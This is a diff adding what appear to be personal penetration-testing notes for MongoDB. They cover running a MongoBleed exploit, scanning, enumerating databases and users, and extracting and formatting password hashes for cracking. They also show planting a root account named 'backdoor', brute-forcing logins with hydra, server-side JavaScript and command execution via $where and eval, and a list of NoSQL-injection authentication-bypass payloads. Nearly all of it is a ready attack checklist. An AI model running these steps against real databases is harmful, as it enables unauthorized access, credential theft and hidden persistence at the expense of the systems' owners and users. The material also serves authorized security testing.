@@ -1,0 +1,158 @@
+﻿https://hackviser.com/tactics/pentesting/services/MongoDB 
+
+Mongobleed: https://github.com/joe-desimone/mongobleed 
+python3 mongobleed.py --host <target>
+
+Regular port is 27017
+nmap -p 27017 -sV -sC <target>
+Install mongosh:
+# Download the .deb package
+wget https://downloads.mongodb.com/compass/mongodb-mongosh_2.3.4_amd64.deb
+
+# Install it
+sudo dpkg -i mongodb-mongosh_2.3.4_amd64.deb
+
+# If you get dependency errors, fix them:
+sudo apt-get install -f
+
+# Verify installation
+mongosh --version
+
+# Clean up the .deb file
+rm mongodb-mongosh_2.3.4_amd64.deb
+
+Connection:
+# No auth
+mongosh mongodb://<host>:27017
+
+# With auth
+mongosh mongodb://user:pass@<host>:27017
+
+Initial Enum Commands:
+# MongoDB version
+db.version()
+
+# Get current database
+db.getName()
+
+# Get current user
+db.runCommand({connectionStatus: 1})
+
+# Check if JavaScript is enabled
+db.adminCommand({getParameter: 1, "javascriptEnabled": 1})
+
+DB Enum Commands:
+# list all databases
+show dbs
+
+# Switch database
+use <database_name>
+
+# List collections (tables)
+show collections
+
+# Select * From <collection>
+db.<collection>.find().pretty()
+
+# Select * From <collection> limit 10
+db.<collection>.find().limit(10)
+
+Enumerate Users:
+use admin
+db.system.users.find()
+db.getUsers()
+db.adminCommand({usersInfo: {forAllDBs: true}})
+
+# Check if authentication is enabled
+db.adminCommand({getCmdLineOpts: 1}).parsed.security
+
+# Extract User Hashes
+# Requires admin access
+use admin
+db.system.users.find()
+
+# Format Hashes for Cracking
+db.system.users.find().forEach(function(u) {
+    print(u.user + ":" + u.credentials["SCRAM-SHA-1"].storedKey);
+})
+
+Create admin user:
+use admin
+db.createUser({
+    user: "backdoor",
+    pwd: "P@ssw0rd123!",
+    roles: [{role: "root", db: "admin"}]
+})
+Bruteforcing:
+# Common default credentials
+admin:admin
+admin:password
+root:root
+mongodb:mongodb
+user:user
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com mongodb
+
+Test Javascript Execution:
+#1
+db.collection.find({$where: "sleep(5000) || true"})
+
+#2
+db.collection.find({$where: function() {
+    var cmd = "whoami";
+    var output = run("bash", "-c", cmd);
+    return true;
+}})
+
+#3
+db.collection.mapReduce(
+    function() { emit(this._id, this); },
+    function(key, values) { 
+        // Malicious code
+        return "pwned";
+    },
+    {out: {inline: 1}}
+)
+
+Command Execution (very unlikely):
+# Check if JavaScript Execution Enabled
+db.adminCommand({getParameter: 1, javascriptEnabled: 1})
+
+# Execute System Commands
+# Requires special configuration
+db.runCommand({
+    eval: "function() { return run('whoami'); }",
+    nolock: true
+})
+
+# Using $where for Command Execution
+# Deprecated but might work
+db.collection.find({$where: "return shellHelper.run('whoami')"})
+
+NOSQL Injection:
+// Authentication bypass
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$exists": true}
+
+// OR operator
+{"$or": [{"username": "admin"}, {"username": "user"}]}
+
+// IN operator
+{"$in": ["admin", "user", "root"]}
+
+// NIN operator (not in)
+{"$nin": ["invalid"]}
+
+// WHERE operator
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+
+// Regex
+{"$regex": "^admin"}
+{"$regex": ".*"}
+
+// Array manipulation
+{"$elemMatch": {"$ne": null}}
